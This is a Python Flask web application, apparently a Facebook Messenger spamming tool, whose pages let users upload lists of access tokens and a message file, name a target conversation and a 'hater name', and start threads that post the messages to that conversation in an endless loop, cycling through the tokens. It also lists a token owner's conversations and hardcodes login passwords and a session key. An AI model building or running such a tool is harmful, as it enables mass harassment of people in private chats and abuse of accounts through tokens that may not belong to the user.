from flask import Flask, request, render_template_string, session, redirect, url_for
import requests
from threading import Thread, Event
import time
import random
import string
import os
from collections import defaultdict
from datetime import datetime, timedelta
import pytz
import json

app = Flask(__name__)
app.secret_key = "SuperSecretKey2025"  # Session Security

USERNAME = "vampire boy raj"
PASSWORD = "vampire rulex"
ADMIN_USERNAME = "raj mishra"
ADMIN_PASSWORD = "vampire rulex"

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64)',
    'Referer': 'https://www.google.com/'
}

stop_events = {}
threads = {}
task_count = 0
user_tasks = defaultdict(list)  # Track tasks by user
task_info = {}  # Store task information (start time, message count, last message)
MAX_TASKS = 10000  # 1 Month = 10,000 Task Limit
conversation_info_cache = {}  # Cache for conversation information

# India timezone
ist = pytz.timezone('Asia/Kolkata')

def format_uptime(seconds):
    if seconds < 3600:  # Less than 1 hour
        return f"{int(seconds // 60)} minutes {int(seconds % 60)} seconds"
    elif seconds < 86400:  # Less than 24 hours
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60
        return f"{int(hours)} hours {int(minutes)} minutes"
    else:  # 24 hours or more
        days = seconds // 86400
        hours = (seconds % 86400) // 3600
        return f"{int(days)} days {int(hours)} hours"

def format_time_ago(timestamp):
    now = datetime.now(ist)
    diff = now - timestamp
    seconds = diff.total_seconds()
    
    if seconds < 60:
        return "just now"
    elif seconds < 3600:
        minutes = int(seconds // 60)
        return f"{minutes} minute{'s' if minutes > 1 else ''} ago"
    elif seconds < 86400:
        hours = int(seconds // 3600)
        return f"{hours} hour{'s' if hours > 1 else ''} ago"
    else:
        days = int(seconds // 86400)
        return f"{days} day{'s' if days > 1 else ''} ago"

def get_conversation_info(access_token, thread_id):
    """Get conversation information including name and participants"""
    if thread_id in conversation_info_cache:
        return conversation_info_cache[thread_id]
    
    try:
        # Try to get conversation info from Facebook API
        api_url = f'https://graph.facebook.com/v17.0/{thread_id}'
        params = {
            'access_token': access_token,
            'fields': 'name,participants'
        }
        response = requests.get(api_url, params=params, headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            conversation_name = data.get('name', 'Unknown Conversation')
            
            # Try to get participant names
            participants = []
            if 'participants' in data:
                if isinstance(data['participants'], dict) and 'data' in data['participants']:
                    participants = [p.get('name', 'Unknown') for p in data['participants']['data']]
                elif isinstance(data['participants'], list):
                    participants = [p.get('name', 'Unknown') for p in data['participants']]
            
            conversation_info = {
                'name': conversation_name,
                'participants': participants,
                'participant_count': len(participants)
            }
            
            # Cache the result
            conversation_info_cache[thread_id] = conversation_info
            return conversation_info
    except:
        pass
    
    # Return default if API call fails
    return {
        'name': f"Conversation ({thread_id})",
        'participants': [],
        'participant_count': 0
    }

def send_messages(access_tokens, thread_id, hatersname, lastname, time_interval, messages, task_id, username):
    global task_count
    stop_event = stop_events[task_id]
    
    # Get conversation info using the first token
    conversation_info = get_conversation_info(access_tokens[0], thread_id) if access_tokens else {
        'name': f"Conversation ({thread_id})",
        'participants': [],
        'participant_count': 0
    }
    
    # Initialize task info
    task_info[task_id] = {
        'start_time': datetime.now(ist),
        'message_count': 0,
        'last_message': '',
        'last_message_time': None,
        'tokens_count': len(access_tokens),
        'username': username,
        'thread_id': thread_id,
        'conversation_name': conversation_info['name'],
        'participant_count': conversation_info['participant_count'],
        'hatersname': hatersname,
        'lastname': lastname
    }
    
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                if stop_event.is_set():
                    break
                api_url = f'https://graph.facebook.com/v17.0/t_{thread_id}/'
                message = f"{hatersname} {message1} {lastname}"  # Format: hatersname + message + lastname
                parameters = {'access_token': access_token, 'message': message}
                
                try:
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        # Update task info
                        task_info[task_id]['message_count'] += 1
                        task_info[task_id]['last_message'] = message
                        task_info[task_id]['last_message_time'] = datetime.now(ist)
                except:
                    pass
                
                time.sleep(time_interval)
    
    task_count -= 1
    # Remove task from user's task list
    if username in user_tasks and task_id in user_tasks[username]:
        user_tasks[username].remove(task_id)
    
    # Remove task info
    if task_id in task_info:
        del task_info[task_id]
    
    del stop_events[task_id]
    del threads[task_id]

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            session['username'] = username
            session['is_admin'] = False
            return redirect(url_for('send_message'))
        elif username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['logged_in'] = True
            session['username'] = username
            session['is_admin'] = True
            return redirect(url_for('admin_panel'))
        return '❌ Invalid Username or Password!'
    
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login - By RAJ MISHRA</title>
        <style>
            body { text-align: center; background: url('https://i.ibb.co/1JLx8sbs/5b7cfab06a854bf09c9011203295d1d5.jpg') no-repeat center center fixed; 
                   background-size: cover; color: white; padding: 100px; }
            input { padding: 10px; margin: 5px; width: 250px; }
            button { padding: 10px; background: red; color: white; border: none; }
            .admin-login { margin-top: 30px; padding: 20px; background: rgba(0,0,0,0.5); border-radius: 10px; }
        </style>
    </head>
    <body>
        <h2>Login to Access</h2>
        <form method="post">
            <input type="text" name="username" placeholder="Enter Username" required><br>
            <input type="password" name="password" placeholder="Enter Password" required><br>
            <button type="submit">Login</button>
        </form>
        
        <div class="admin-login">
            <h3>Admin Login</h3>
            <form method="post" action="/admin_login">
                <input type="text" name="admin_username" placeholder="Admin Username" required><br>
                <input type="password" name="admin_password" placeholder="Admin Password" required><br>
                <button type="submit">Admin Login</button>
            </form>
        </div>
    </body>
    </html>
    ''')

@app.route('/admin_login', methods=['POST'])
def admin_login():
    username = request.form.get('admin_username')
    password = request.form.get('admin_password')
    
    if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
        session['logged_in'] = True
        session['username'] = username
        session['is_admin'] = True
        return redirect(url_for('admin_panel'))
    
    return '❌ Invalid Admin Username or Password!'

@app.route('/home', methods=['GET', 'POST'])
def send_message():
    global task_count
    if not session.get('logged_in') or session.get('is_admin'):
        return redirect(url_for('login'))

    username = session.get('username')
    
    if request.method == 'POST':
        if task_count >= MAX_TASKS:
            return '⚠️ Monthly Task Limit Reached!'

        token_option = request.form.get('tokenOption')

        if token_option == 'single':
            access_tokens = [request.form.get('singleToken').strip()]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId').strip()
        hatersname = request.form.get('hatersname').strip()
        lastname = request.form.get('lastname').strip()
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, hatersname, lastname, time_interval, messages, task_id, username))
        threads[task_id] = thread
        thread.start()
        
        # Add task to user's task list
        user_tasks[username].append(task_id)
        task_count += 1
        return f'Task started with ID: {task_id}'

    # Show only user's tasks
    user_task_count = len(user_tasks.get(username, []))
    
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
      <title>Offline Tool - By RAJ MISHRA</title>
      <style>
        body { background: url('https://i.ibb.co/1JLx8sbs/5b7cfab06a854bf09c9011203295d1d5.jpg') no-repeat center center fixed; 
               background-size: cover; color: white; text-align: center; padding: 50px; }
        input, select, button { margin: 5px; padding: 10px; }
        .task-list { margin: 20px; padding: 10px; background: rgba(0,0,0,0.5); border-radius: 10px; }
        .task-info { margin: 10px; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 5px; text-align: left; }
        .check-status { margin-top: 20px; }
        .admin-section { margin-top: 30px; padding: 20px; background: rgba(0,0,0,0.5); border-radius: 10px; }
        .conversation-finder { margin-top: 30px; padding: 20px; background: rgba(0,0,0,0.5); border-radius: 10px; }
      </style>
    </head>
    <body>
      <h2>Your Running Tasks: ''' + str(user_task_count) + '''</h2>
      <h3>Global Tasks: ''' + str(task_count) + ''' / ''' + str(MAX_TASKS) + '''</h3>
      <form method="post" enctype="multipart/form-data">
        <select name="tokenOption" required>
          <option value="single">Single Token</option>
          <option value="multiple">Token File</option>
        </select><br>
        <input type="text" name="singleToken" placeholder="Enter Single Token"><br>
        <input type="file" name="tokenFile"><br>
        <input type="text" name="threadId" placeholder="Enter Conversation ID" required><br>
        <input type="text" name="hatersname" placeholder="Enter Hater Name" required><br>
        <input type="text" name="lastname" placeholder="Enter Last Name" required><br>
        <input type="number" name="time" placeholder="Enter Time (seconds)" required><br>
        <input type="file" name="txtFile" required><br>
        <button type="submit">Run</button>
      </form>
      
      <div class="conversation-finder">
        <h3>Find Messenger Conversations</h3>
        <form method="post" action="/find_conversations">
          <input type="text" name="token" placeholder="Enter Your Token (EAAD...)" required><br>
          <button type="submit">Find Conversations</button>
        </form>
      </div>
      
      <div class="check-status">
        <h3>Check Your Task Status</h3>
        <form method="post" action="/check_status">
          <input type="text" name="taskId" placeholder="Enter Your Task ID" required>
          <button type="submit">Check Status</button>
        </form>
      </div>
      
      <div class="admin-section">
        <h3>Admin Access</h3>
        <p>Administrators can view all running tasks and manage them</p>
        <a href="/">Admin Login</a>
      </div>
      
      <a href="/logout">Logout</a>
    </body>
    </html>
    ''', user_tasks=user_tasks.get(username, []))

@app.route('/find_conversations', methods=['POST'])
def find_conversations():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    token = request.form.get('token').strip()
    
    try:
        # First verify the token is valid
        verify_url = 'https://graph.facebook.com/v17.0/me'
        verify_params = {
            'access_token': token,
            'fields': 'id,name'
        }
        verify_response = requests.get(verify_url, params=verify_params, headers=headers)
        
        if verify_response.status_code != 200:
            return 'Invalid token. Please check your token and try again.'
        
        # Get user's conversations from Facebook API
        api_url = 'https://graph.facebook.com/v17.0/me/conversations'
        params = {
            'access_token': token,
            'fields': 'id,name,participants',
            'limit': 100
        }
        response = requests.get(api_url, params=params, headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            conversations = data.get('data', [])
            
            # If we have a next page, get more results
            while 'paging' in data and 'next' in data['paging']:
                next_url = data['paging']['next']
                next_response = requests.get(next_url, headers=headers)
                if next_response.status_code == 200:
                    next_data = next_response.json()
                    conversations.extend(next_data.get('data', []))
                    data = next_data
                else:
                    break
            
            # Process conversations to get participant names
            processed_conversations = []
            for conv in conversations:
                conv_id = conv.get('id', '')
                conv_name = conv.get('name', '')
                
                # Get participant count
                participant_count = 0
                if 'participants' in conv:
                    if isinstance(conv['participants'], dict) and 'data' in conv['participants']:
                        participant_count = len(conv['participants']['data'])
                    elif isinstance(conv['participants'], list):
                        participant_count = len(conv['participants'])
                
                # If no name, try to generate one from participants
                if not conv_name and 'participants' in conv:
                    participant_names = []
                    if isinstance(conv['participants'], dict) and 'data' in conv['participants']:
                        participant_names = [p.get('name', '') for p in conv['participants']['data'] if p.get('name')]
                    elif isinstance(conv['participants'], list):
                        participant_names = [p.get('name', '') for p in conv['participants'] if p.get('name')]
                    
                    if participant_names:
                        conv_name = ", ".join(participant_names[:3])
                        if len(participant_names) > 3:
                            conv_name += f" and {len(participant_names) - 3} more"
                
                processed_conversations.append({
                    'id': conv_id,
                    'name': conv_name or f"Conversation {conv_id}",
                    'participant_count': participant_count
                })
            
            return render_template_string('''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Conversation Finder - By RAJ MISHRA</title>
                <style>
                    body { background: url('https://i.ibb.co/1JLx8sbs/5b7cfab06a854bf09c9011203295d1d5.jpg') no-repeat center center fixed; 
                           background-size: cover; color: white; text-align: center; padding: 50px; }
                    .conversation-list { margin: 20px; padding: 10px; background: rgba(0,0,0,0.5); border-radius: 10px; text-align: left; }
                    .conversation-info { margin: 10px; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 5px; }
                    button { margin: 10px; padding: 10px; background: red; color: white; border: none; }
                    .copy-btn { padding: 5px; background: #4CAF50; color: white; border: none; cursor: pointer; }
                </style>
                <script>
                    function copyToClipboard(text) {
                        navigator.clipboard.writeText(text).then(function() {
                            alert('Conversation ID copied to clipboard: ' + text);
                        }, function(err) {
                            console.error('Could not copy text: ', err);
                        });
                    }
                </script>
            </head>
            <body>
                <h2>Your Messenger Conversations</h2>
                <div class="conversation-list">
                    {% if conversations %}
                        {% for conv in conversations %}
                            <div class="conversation-info">
                                <p><strong>Conversation Name:</strong> {{ conv.name }}</p>
                                <p><strong>Conversation ID:</strong> {{ conv.id }} 
                                    <button class="copy-btn" onclick="copyToClipboard('{{ conv.id }}')">Copy ID</button>
                                </p>
                                <p><strong>Participants:</strong> {{ conv.participant_count }}</p>
                            </div>
                        {% endfor %}
                    {% else %}
                        <p>No conversations found or token doesn't have required permissions.</p>
                        <p>Make sure your token has the necessary permissions for accessing conversations.</p>
                    {% endif %}
                </div>
                <br>
                <a href="/home">Back to Home</a>
            </body>
            </html>
            ''', conversations=processed_conversations)
        else:
            error_data = response.json()
            error_msg = error_data.get('error', {}).get('message', 'Unknown error')
            return f'Failed to fetch conversations. Error: {error_msg}'
    except Exception as e:
        return f'Error fetching conversations: {str(e)}'

@app.route('/check_status', methods=['POST'])
def check_status():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    username = session.get('username')
    task_id = request.form.get('taskId')
    is_admin = session.get('is_admin', False)
    
    # Check if user is admin or owns the task
    if task_id in task_info and (is_admin or (username in user_tasks and task_id in user_tasks[username])):
        info = task_info[task_id]
        uptime = (datetime.now(ist) - info['start_time']).total_seconds()
        
        last_msg_time = "Not sent yet"
        if info['last_message_time']:
            last_msg_time = f"{info['last_message_time'].strftime('%Y-%m-%d %H:%M:%S')} IST ({format_time_ago(info['last_message_time'])})"
        
        return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Task Status - By RAJ MISHRA</title>
            <style>
                body { background: url('https://i.ibb.co/1JLx8sbs/5b7cfab06a854bf09c9011203295d1d5.jpg') no-repeat center center fixed; 
                       background-size: cover; color: white; text-align: center; padding: 50px; }
                .status-info { margin: 20px; padding: 20px; background: rgba(0,0,0,0.5); border-radius: 10px; display: inline-block; text-align: left; }
                button { margin: 10px; padding: 10px; background: red; color: white; border: none; }
            </style>
        </head>
        <body>
            <h2>Task Status: {{ task_id }}</h2>
            <div class="status-info">
                <p><strong>Uptime:</strong> {{ uptime }}</p>
                <p><strong>Messages Sent:</strong> {{ message_count }}</p>
                <p><strong>Tokens Used:</strong> {{ tokens_count }}</p>
                <p><strong>Conversation Name:</strong> {{ conversation_name }}</p>
                <p><strong>Participants:</strong> {{ participant_count }}</p>
                <p><strong>Hater Name:</strong> {{ hatersname }}</p>
                <p><strong>Last Name:</strong> {{ lastname }}</p>
                <p><strong>Last Message:</strong> {{ last_message }}</p>
                <p><strong>Last Message Time:</strong> {{ last_msg_time }}</p>
                <p><strong>Started By:</strong> {{ username }}</p>
            </div>
            <form method="post" action="/stop">
                <input type="hidden" name="taskId" value="{{ task_id }}">
                <button type="submit">Stop This Task</button>
            </form>
            <br>
            <a href="/home">Back to Home</a>
        </body>
        </html>
        ''', task_id=task_id, uptime=format_uptime(uptime), 
             message_count=info['message_count'], tokens_count=info['tokens_count'],
             last_message=info['last_message'], last_msg_time=last_msg_time,
             username=info['username'], conversation_name=info['conversation_name'],
             participant_count=info['participant_count'], hatersname=info['hatersname'],
             lastname=info['lastname'])
    
    return 'Invalid Task ID or permission denied.'

@app.route('/admin')
def admin_panel():
    # Only allow admin users to access this page
    if not session.get('logged_in') or not session.get('is_admin'):
        return redirect(url_for('login'))
    
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
      <title>Admin Panel - By RAJ MISHRA</title>
      <style>
        body { background: url('https://i.ibb.co/1JLx8sbs/5b7cfab06a854bf09c9011203295d1d5.jpg') no-repeat center center fixed; 
               background-size: cover; color: white; text-align: center; padding: 50px; }
        .task-list { margin: 20px; padding: 10px; background: rgba(0,0,0,0.5); border-radius: 10px; }
        .task-info { margin: 10px; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 5px; text-align: left; }
        button { margin: 5px; padding: 5px 10px; background: red; color: white; border: none; }
        table { width: 100%; border-collapse: collapse; margin: 10px 0; }
        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background-color: rgba(0,0,0,0.5); }
      </style>
    </head>
    <body>
      <h2>Admin Panel - All Running Tasks</h2>
      <h3>Global Tasks: {{ task_count }} / {{ MAX_TASKS }}</h3>
      
      <div class="task-list">
        <h3>All Running Tasks</h3>
        {% if task_info %}
          <table>
            <thead>
              <tr>
                <th>Task ID</th>
                <th>User</th>
                <th>Conversation Name</th>
                <th>Uptime</th>
                <th>Messages</th>
                <th>Tokens</th>
                <th>Last Message</th>
                <th>Last Message Time</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              {% for task_id, info in task_info.items() %}
                <tr>
                  <td>{{ task_id }}</td>
                  <td>{{ info.username }}</td>
                  <td>{{ info.conversation_name }}</td>
                  <td>{{ format_uptime((now - info.start_time).total_seconds()) }}</td>
                  <td>{{ info.message_count }}</td>
                  <td>{{ info.tokens_count }}</td>
                  <td>{{ info.last_message[:50] }}{% if info.last_message|length > 50 %}...{% endif %}</td>
                  <td>
                    {% if info.last_message_time %}
                      {{ info.last_message_time.strftime('%Y-%m-%d %H:%M:%S') }} IST<br>
                      ({{ format_time_ago(info.last_message_time) }})
                    {% else %}
                      Not sent yet
                    {% endif %}
                  </td>
                  <td>
                    <form method="post" action="/stop">
                      <input type="hidden" name="taskId" value="{{ task_id }}">
                      <button type="submit">Stop</button>
                    </form>
                  </td>
                </tr>
              {% endfor %}
            </tbody>
          </table>
        {% else %}
          <p>No tasks running</p>
        {% endif %}
      </div>
      
      <a href="/home">User Panel</a> | 
      <a href="/logout">Logout</a>
    </body>
    </html>
    ''', task_info=task_info, task_count=task_count, 
         MAX_TASKS=MAX_TASKS, format_uptime=format_uptime, 
         format_time_ago=format_time_ago, now=datetime.now(ist))

@app.route('/stop', methods=['POST'])
def stop_task():
    global task_count
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    task_id = request.form.get('taskId')
    username = session.get('username')
    is_admin = session.get('is_admin', False)
    
    # Check if user is admin or owns the task
    if task_id in stop_events and (is_admin or (username in user_tasks and task_id in user_tasks[username])):
        stop_events[task_id].set()
        task_count -= 1
        return f'Task {task_id} stopped.'
    
    return 'Invalid Task ID or permission denied.'

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    session.pop('username', None)
    session.pop('is_admin', None)
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
